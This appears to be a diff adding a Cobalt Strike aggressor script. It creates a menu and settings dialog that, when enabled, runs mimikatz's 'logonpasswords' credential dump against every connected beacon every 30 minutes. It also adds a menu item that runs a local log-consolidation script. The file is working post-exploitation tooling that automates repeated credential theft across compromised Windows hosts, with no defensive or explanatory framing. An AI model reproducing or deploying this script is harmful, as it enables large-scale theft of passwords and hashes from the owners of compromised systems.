@@ -1,0 +1,44 @@
+$enabledsetting = 'false';
+
+sub mimikatz-settings {
+	@bids = $1;
+
+	$dialog = dialog("Mimikatz Loop Settings", %(enabled => $enabledsetting), lambda({
+		$enabledsetting = $3['enabled'];
+
+		}));
+
+	dialog_description($dialog, "Run mimikatz's 'logonpasswords' command every 30 minutes while enabled.");
+	
+	drow_checkbox($dialog, "enabled", "Enabled:");
+
+	dbutton_action($dialog, "Save");
+	
+	dialog_show($dialog);
+
+}
+
+
+on heartbeat_30m {
+	if ($enabledsetting eq 'true') {
+	    foreach $beacon (beacons()) {
+	        $id = $beacon['id'];
+	 		binput($id, "logonpasswords");
+			blogonpasswords($id);
+	    }
+	}
+}
+
+menubar("Extra", "extra-settings", 2);
+
+popup extra-settings {
+    item "Configure Mimikatz" {
+        mimikatz-settings();
+    }
+    item "&Export OP Logs to HTML" {
+		prompt_confirm("Do you want to consolidate all OP Logs? (Recommended for Post Operation)", "Log Consolidation", {
+			show_message("Consolidating all OP Logs...");
+			exec("/bt/cobaltstrike/logs.py " . mynick());
+		});
+	}
+}
